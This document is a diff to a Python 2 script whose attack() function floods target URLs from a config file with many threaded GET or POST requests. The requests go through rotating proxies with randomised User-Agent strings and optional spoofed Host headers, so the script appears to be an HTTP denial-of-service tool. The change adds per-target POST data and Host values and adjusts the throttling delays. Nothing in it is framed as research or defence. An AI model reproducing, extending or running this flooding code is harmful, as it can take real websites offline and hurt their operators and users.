@@ -19,7 +19,6 @@ g_thread = 10
 r = open("config.txt").read()
 js = json.loads(r)
 g_lst_target = js['target']
-g_target_host = js['host']
 g_thread = js['thread']
 
 if g_thread > 600:
@@ -35,7 +34,6 @@ if len(g_lst_target) == 0:
 
 print 'Ver 0.1'
 print 'target %s' % (g_lst_target)
-print 'host %s' % (g_target_host)
 print 'thread %s' % (g_thread)
 
 def attack():
@@ -53,11 +51,13 @@ def attack():
             proxies = {'http': 'http://%s:%s' % (proxy.ip, proxy.port)}
             s = requests.Session()
             headers = {'User-Agent': useragenthelper.get()}
-            if g_target_host is not None:
-                if len(g_target_host)>0:
-                    headers['Host'] = g_target_host
-            r = s.get(target, timeout=2, headers=headers, proxies=proxies)
-            print r.text
+            if len(target[1])>0:
+                headers['Host'] = target[1]
+            if len(target[2])>0:
+                r = s.post(target[0], data=target[2],timeout=2, headers=headers, proxies=proxies)
+            else:
+                r = s.get(target[0], timeout=2, headers=headers, proxies=proxies)
+            print r.text[200:]
         except ConnectionError:
             #put = 0
             pass
@@ -92,6 +92,6 @@ while True:
     if pool.count > 8000:
         time.sleep(80)
     elif pool.count > 2000:
-        time.sleep(20)
+        time.sleep(40)
     elif pool.count > 1000:
-        time.sleep(10)
+        time.sleep(20)
